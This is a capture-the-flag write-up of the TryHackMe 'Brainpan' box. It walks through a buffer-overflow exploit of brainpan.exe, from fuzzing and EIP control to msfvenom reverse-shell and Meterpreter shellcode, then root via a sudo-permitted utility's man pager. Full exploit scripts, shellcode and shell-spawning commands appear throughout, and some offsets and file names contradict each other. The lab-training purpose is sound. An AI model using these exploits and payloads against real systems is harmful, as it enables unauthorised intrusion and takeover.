Brainpan
=========

This is a CTF on https://tryhackme.com

Buffer Overflow
=================

    - We Fuzz the executable.
    - We crash the app and get control of the EIP.
    - We locate the bad characters
    - We find and select a Jump Point
    - We then generate our payload code
    - We make sure to add our NOP sleds.
    - We exploit.

Port Scanning
=============

    ------------------------------------------------------------
            Threader 3000 - Multi-threaded Port Scanner          
                           Version 1.0.7                    
                       A project by The Mayor               
    ------------------------------------------------------------
    Enter your target IP address or URL here: 10.10.231.228
    ------------------------------------------------------------
    Scanning target 10.10.231.228
    Time started: 2022-10-15 11:07:59.964522
    ------------------------------------------------------------
    Port 10000 is open
    Port 9999 is open
    Port scan completed in 0:00:18.922491
    ------------------------------------------------------------
    Threader3000 recommends the following Nmap scan:
    ************************************************************
    nmap -p10000,9999 -sV -sC -T4 -Pn -oA 10.10.231.228 10.10.231.228
    ************************************************************
    Would you like to run Nmap or quit to terminal?
    ------------------------------------------------------------
    1 = Run suggested Nmap scan
    2 = Run another Threader3000 scan
    3 = Exit to terminal
    ------------------------------------------------------------
    Option Selection: 3
    
    nmap -p- -sC -sS -sV 10.10.231.228 -Pn
    Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-15 11:09 BST
    Nmap scan report for 10.10.231.228
    Host is up (0.041s latency).
    Not shown: 65533 closed tcp ports (reset)
    PORT      STATE SERVICE VERSION
    9999/tcp  open  abyss?
    | fingerprint-strings: 
    |   NULL: 
    |     _| _| 
    |     _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_| 
    |     _|_| _| _| _| _| _| _| _| _| _| _| _|
    |     _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _|
    |     [________________________ WELCOME TO BRAINPAN _________________________]
    |_    ENTER THE PASSWORD
    10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)
    |_http-title: Site doesn't have a title (text/html).
    |_http-server-header: SimpleHTTP/0.6 Python/2.7.3
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ 
    Nmap done: 1 IP address (1 host up) scanned in 105.53 seconds

It seems like there is a strange server running on 9999, and a webserver on port 10 000,lets see what we can find.

Enumerating Port 10000 - HTTP Server
====================================

First lets check the website out http://10.10.231.228:10000/. I ran a gobuster in the background to see what I could pick up.

    gobuster dir -u http://10.10.231.228:10000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -z 
    ===============================================================
    Gobuster v3.2.0-dev
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    [+] Url:                     http://10.10.231.228:10000
    [+] Method:                  GET
    [+] Threads:                 10
    [+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
    [+] Negative Status codes:   404
    [+] User Agent:              gobuster/3.2.0-dev
    [+] Timeout:                 10s
    ===============================================================
    2022/10/15 11:14:53 Starting gobuster in directory enumeration mode
    ===============================================================
    /bin                  (Status: 301) [Size: 0] [--> /bin/]

If we go to this http://10.10.231.228:10000/bin we see there is a file called brainpan.exe we can download! 

Lets have a look at this brainpan.exe im more depth using Immunity Debugger and Netcat.

Mona Config / Immunity Debugger
================================

Now that we have the Files we can transfer both files to the Windows 7 VM that has immunity Debugger.

    Right-click the Immunity Debugger icon on the Windows 7 VM and choose "Run as administrator".

I use the mona script, however to make it easier to work with, you should configure a working folder using the following command, which you can run in the command input box at the bottom of the Immunity Debugger window:

    !mona config -set workingfolder c:\mona\%p

The latest version can be downloaded here: https://github.com/corelan/mona

Open the brainpan.exe and have a look at how it functions

On your Kali box, connect to port 9999 on 192.168.133.131 using netcat: 

    

Now make sure to keep an eye on the exe its self so you can create a fuzzer

Fuzzing
=======

The following Python script can be modified and used to fuzz remote entry points to an application. It will send increasingly long buffer strings in the hope that one eventually crashes the application.
port socket, time, sys

    ip = "192.168.133.132"

    port = 9999
    timeout = 5

    # Create an array of increasing length buffer strings.
    buffer = ['A']
    counter = 100
    while len(buffer) < 30:
        buffer.append("A" * counter)
        counter += 100

    for string in buffer:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            connect = s.connect((ip, port))
            s.recv(1024)
            print("Fuzzing with %s bytes" % len(string))
            s.send(bytes(string, "latin-1"  + "\r\n"))
            s.recv(1024)
            s.close()
        except:
            print("Could not connect to " + ip + ":" + str(port))
            sys.exit(0)
        time.sleep(1)

The fuzzer will send increasingly long strings comprised of A's. If the fuzzer crashes the server with one of the strings, the fuzzer should exit with an error message. Make a note of the largest number of bytes that were sent.

    python fuzzer.py                                  
    Fuzzing with 1 bytes
    Fuzzing with 100 bytes
    Fuzzing with 200 bytes
    Fuzzing with 300 bytes
    Fuzzing with 400 bytes
    Fuzzing with 500 bytes
    Fuzzing with 600 bytes
    Could not connect to 192.168.133.132:9999

Fuzzing crashed at 600 bytes

Crash Replication & Controlling EIP
===================================

Create another file on your Kali box called exploit.py with the following contents:

    import socket
    
    ip = ""
    port = 31337

    prefix = ""
    offset = 0
    overflow = "A" * offset
    retn = ""
    padding = ""
    payload = ""
    postfix = ""

    buffer = prefix + overflow + retn + padding + payload + postfix
    byte_message = bytes(buffer, "utf-8")

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        s.connect((ip, port))
        print("Sending evil buffer...")
        s.send(byte_message + b"\r\n")
        print("Done!")
    except:
        print("Could not connect.")

Using the buffer length which caused the crash, generate a unique buffer so we can determine the offset in the pattern which overwrites the EIP register, and the offset in the pattern to which other registers point. Create a pattern that is 400 bytes larger than the crash buffer, so that we can determine whether our shellcode can fit immediately. If the larger buffer doesn't crash the application, use a pattern equal to the crash buffer length and slowly add more to the buffer to find space.

Fuzzing crashed at 600 bytes

    msf-pattern_create -l 1000    

    Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B

On Windows, in Immunity Debugger, re-open the chatserver.exe again using the same method as before, and click the red play icon(twice) to get it running. You will have to do this prior to each time we run the exploit.py (which we will run multiple times with incremental modifications).

While the unique buffer is on the stack, use mona's findmsp command, with the distance argument set to the pattern length.

    !mona findmsp -distance 1000
    EIP contains normal pattern : 0x35724134 (offset 524)

Equally you can also use msf-pattern_offeset

    msf-pattern_offset -q 35724134
    [*] Exact match at offset 524

Now lets Create a new buffer using this information to ensure that we can control EIP:

Update your exploit.py script and set the offset variable to this value (was previously set to 0). Set the payload variable to an empty string again. Set the retn variable to "BBBB".

    prefix = ""
    offset = 146
    overflow = "A" * offset
    retn = "BBBB"
    padding = ""
    payload = ""
    postfix = ""

    buffer = prefix + overflow + retn + padding + payload + postfix
    
Crash the application using this buffer, and make sure that EIP is overwritten by B's (\\x42)e.g. 42424242.

Finding Bad Characters
======================

Generate a bytearray using mona, and exclude the null byte (\\x00) by default. Note the location of the bytearray.bin file that is generated.

    !mona bytearray -b "\x00"

Now generate a string of bad chars that is identical to the bytearray. The following python script can be used to generate a string of bad chars from \\x01 to \\xff:

    from __future__ import print_function

    for x in range(1, 256):
        print("\\x" + "{:02x}".format(x), end='')

    print()

Crash the application using this buffer, and make a note of the address to which ESP points. This can change every time you crash the application, so get into the habit of copying it from the register each time.

Use the mona compare command to reference the bytearray you generated, and the address to which ESP points:

    !mona compare -f C:\mona\brainpan\bytearray.bin -a <address>

We take note of the badchars returned:

    00

The first badchar in the list should be the null byte (\x00) since we already removed it from the file. Make a note of any others. Generate a new bytearray in mona, specifying these new badchars along with \x00. Then update the payload variable in your exploit.py script and remove the new badchars as well.

As we dont have any bad chars we dont need to submit a new mona array

Find a Jump Point
=================

The mona jmp command can be used to search for jmp (or equivalent) instructions to a specific register. The jmp command will, by default, ignore any modules that are marked as aslr or rebase.

The following example searches for "jmp esp" or equivalent (e.g. call esp, push esp; retn, etc.) while ensuring that the address of the instruction doesn't contain the bad chars \\x00, \\x0a, and \\x0d.

    !mona jmp -r esp -cpb "\x00"

Choose an address and update your exploit.py script, setting the “retn” variable to the address, written backwards. For example if the address is \x01\x02\x03\x04 in Immunity, write it as \x04\x03\x02\x01 in your exploit.

    Our address is 311712f3 so our retn = "xf3\x12\x17\x31"

Generate Payload
================

Generate a reverse shell payload using msfvenom, making sure to exclude the same bad chars that were found previously:

    msfvenom -p windows/shell_reverse_tcp LHOST=10.18.91.23 LPORT=4444 EXITFUNC=thread -b "\x00" -f py
    [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
    [-] No arch selected, selecting arch: x86 from the payload
    Found 11 compatible encoders
    Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
    x86/shikata_ga_nai succeeded with size 351 (iteration=0)
    x86/shikata_ga_nai chosen with final size 351
    Payload size: 351 bytes
    Final size of py file: 1745 bytes

    buf =  b""
    buf += b"\xba\xb1\xa3\xca\x34\xdb\xd7\xd9\x74\x24\xf4\x58"
    buf += b"\x2b\xc9\xb1\x52\x31\x50\x12\x83\xc0\x04\x03\xe1"
    buf += b"\xad\x28\xc1\xfd\x5a\x2e\x2a\xfd\x9a\x4f\xa2\x18"
    buf += b"\xab\x4f\xd0\x69\x9c\x7f\x92\x3f\x11\x0b\xf6\xab"
    buf += b"\xa2\x79\xdf\xdc\x03\x37\x39\xd3\x94\x64\x79\x72"
    buf += b"\x17\x77\xae\x54\x26\xb8\xa3\x95\x6f\xa5\x4e\xc7"
    buf += b"\x38\xa1\xfd\xf7\x4d\xff\x3d\x7c\x1d\x11\x46\x61"
    buf += b"\xd6\x10\x67\x34\x6c\x4b\xa7\xb7\xa1\xe7\xee\xaf"
    buf += b"\xa6\xc2\xb9\x44\x1c\xb8\x3b\x8c\x6c\x41\x97\xf1"
    buf += b"\x40\xb0\xe9\x36\x66\x2b\x9c\x4e\x94\xd6\xa7\x95"
    buf += b"\xe6\x0c\x2d\x0d\x40\xc6\x95\xe9\x70\x0b\x43\x7a"
    buf += b"\x7e\xe0\x07\x24\x63\xf7\xc4\x5f\x9f\x7c\xeb\x8f"
    buf += b"\x29\xc6\xc8\x0b\x71\x9c\x71\x0a\xdf\x73\x8d\x4c"
    buf += b"\x80\x2c\x2b\x07\x2d\x38\x46\x4a\x3a\x8d\x6b\x74"
    buf += b"\xba\x99\xfc\x07\x88\x06\x57\x8f\xa0\xcf\x71\x48"
    buf += b"\xc6\xe5\xc6\xc6\x39\x06\x37\xcf\xfd\x52\x67\x67"
    buf += b"\xd7\xda\xec\x77\xd8\x0e\xa2\x27\x76\xe1\x03\x97"
    buf += b"\x36\x51\xec\xfd\xb8\x8e\x0c\xfe\x12\xa7\xa7\x05"
    buf += b"\xf5\xc2\x25\x5e\x12\xbb\x4b\x60\x0d\x67\xc5\x86"
    buf += b"\x47\x87\x83\x11\xf0\x3e\x8e\xe9\x61\xbe\x04\x94"
    buf += b"\xa2\x34\xab\x69\x6c\xbd\xc6\x79\x19\x4d\x9d\x23"
    buf += b"\x8c\x52\x0b\x4b\x52\xc0\xd0\x8b\x1d\xf9\x4e\xdc"
    buf += b"\x4a\xcf\x86\x88\x66\x76\x31\xae\x7a\xee\x7a\x6a"
    buf += b"\xa1\xd3\x85\x73\x24\x6f\xa2\x63\xf0\x70\xee\xd7"
    buf += b"\xac\x26\xb8\x81\x0a\x91\x0a\x7b\xc5\x4e\xc5\xeb"
    buf += b"\x90\xbc\xd6\x6d\x9d\xe8\xa0\x91\x2c\x45\xf5\xae"
    buf += b"\x81\x01\xf1\xd7\xff\xb1\xfe\x02\x44\xd1\x1c\x86"
    buf += b"\xb1\x7a\xb9\x43\x78\xe7\x3a\xbe\xbf\x1e\xb9\x4a"
    buf += b"\x40\xe5\xa1\x3f\x45\xa1\x65\xac\x37\xba\x03\xd2"
    buf += b"\xe4\xbb\x01"

Prepend NOPs
============

If an encoder was used (more than likely if bad chars are present, remember to prepend at least 16 NOPs (\\x90) to the payload.

    padding = "\x90" * 16

Final Buffer (Shell Exploit)
============================

With the correct prefix, offset, return address, padding, and payload set, you can now exploit the buffer overflow to get a reverse shell. Start a netcat listener on your Kali box using the LPORT you specified in the msfvenom command (4444 if you didn’t change it).

    nc - lvnp 4444
    listening on [any] 4444 ...

Restart chatserver.exe in Immunity and run the modified exploit.py script again. Your netcat listener should catch a reverse shell!

    listening on [any] 4444 ...
    connect to [192.168.133.129] from (UNKNOWN) [192.168.133.132] 49352
    Microsoft Windows [Version 6.1.7601]
    Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

    C:\Users\Sloppy\Desktop\Cyber Security\Brainpan>

Now that we have POC, lets change the payload and exploit with Meterpreter

Privilege Escalation
====================

Lets upgrade our shell to a meterpreter session (We are switching to a linux shell now). Lets make a new payload with msfvenom for the exploit.

     msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.18.91.23 LPORT=4444 EXITFUNC=thread -b "\x00" -f py
    [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
    [-] No arch selected, selecting arch: x86 from the payload
    Found 11 compatible encoders
    Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
    x86/shikata_ga_nai succeeded with size 150 (iteration=0)
    x86/shikata_ga_nai chosen with final size 150
    Payload size: 150 bytes
    Final size of py file: 754 bytes
    buf =  b""
    buf += b"\xbf\x23\xd4\xaa\xdf\xdb\xdf\xd9\x74\x24\xf4\x58"
    buf += b"\x33\xc9\xb1\x1f\x83\xe8\xfc\x31\x78\x11\x03\x78"
    buf += b"\x11\xe2\xd6\xbe\xa0\x81\x29\xe4\x42\xde\x1a\x59"
    buf += b"\xfe\x4b\x9e\xed\x66\x05\x7f\xc0\xe7\x82\x24\xb3"
    buf += b"\xed\xbe\x81\x54\x9a\xbc\x35\x4a\x06\x48\xd4\x06"
    buf += b"\xd0\x12\x46\x86\x4b\x2a\x87\x6b\xb9\xac\xc2\xac"
    buf += b"\x38\xb4\x82\x58\x86\xae\xb8\xa1\xf8\x2e\xe4\xcb"
    buf += b"\xf8\x44\x11\x85\x1a\xa9\xd0\x58\x5c\x4f\x22\x1b"
    buf += b"\xe0\xbb\x85\x6e\x1d\x85\xc9\x9e\x22\xf5\x40\x7d"
    buf += b"\xe3\x1e\x5e\x43\x07\xec\xee\x3e\x05\x6d\x8b\x01"
    buf += b"\xed\x7e\xc8\x08\xef\xe6\x5c\x60\x40\x1b\x6d\xf5"
    buf += b"\x25\xdc\x15\xf4\xda\x3c\x5d\xf9\x24\xbf\x9d\x41"
    buf += b"\x25\xbf\x9d\xb5\xeb\x3f"

Now our exploit is ready lets set up multi handler meterpreter and run the exploit again.

    msf6 > use exploit/multi/handler 
    [*] Using configured payload generic/shell_reverse_tcp
    msf6 exploit(multi/handler) > set payload linux/x86/meterpreter/reverse_tcp
    payload => linux/x86/meterpreter/reverse_tcp
    msf6 exploit(multi/handler) > set LHOST 10.18.91.23
    LHOST => 10.18.91.23
    msf6 exploit(multi/handler) > set LPORT 4444
    LPORT => 4444
    msf6 exploit(multi/handler) > run

    [*] Started reverse TCP handler on 10.18.91.23:4444 
    [*] Sending stage (1017704 bytes) to 10.10.67.121
    [*] Meterpreter session 1 opened (10.18.91.23:4444 -> 10.10.67.121:37460) at 2022-10-15 17:04:48 +0100
    meterpreter > shell
    Process 931 created.
    Channel 1 created.
    python3 -c 'import pty;pty.spawn("/bin/bash")'
    puck@brainpan:~$ 

First, stabilize the shell with

    python3 -c 'import pty;pty.spawn("/bin/bash")'

Now lets see what we can find, simple sudo -l to see what privilages we have if any

    puck@brainpan:~$ sudo -l
    sudo -l
    Matching Defaults entries for puck on this host:
        env_reset, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
        
    User puck may run the following commands on this host:
        (root) NOPASSWD: /home/anansi/bin/anansi_util

We seem to be able to run this /home/anansi/bin/anansi_util as SUDO, if we run it it seems like we can use manual (man) so lets check GTFO bins

    puck@brainpan:~$ sudo /home/anansi/bin/anansi_util
    sudo /home/anansi/bin/anansi_util
    Usage: /home/anansi/bin/anansi_util [action]
    Where [action] is one of:
      - network
      - proclist
      - manual [command]
    puck@brainpan:~$ 

we check out GTFO bins and find this 

    man man
    !/bin/sh

Lets try this with our SUDO now

    puck@brainpan:~$ sudo /home/anansi/bin/anansi_util manual man
    sudo /home/anansi/bin/anansi_util manual man
    No manual entry for manual
    WARNING: terminal is not fully functional
    -  (press RETURN)!/bin/bash
    !/bin/bash
    root@brainpan:/usr/share/man# 

We have root!!!!

Conclusion
==========

This box was actually a little easier for me, I was considering using winpeas but was lucky to stumble across sudo -l first, I used alot of resources online and plenty of trial and error, hope you enjoyed this and it helps.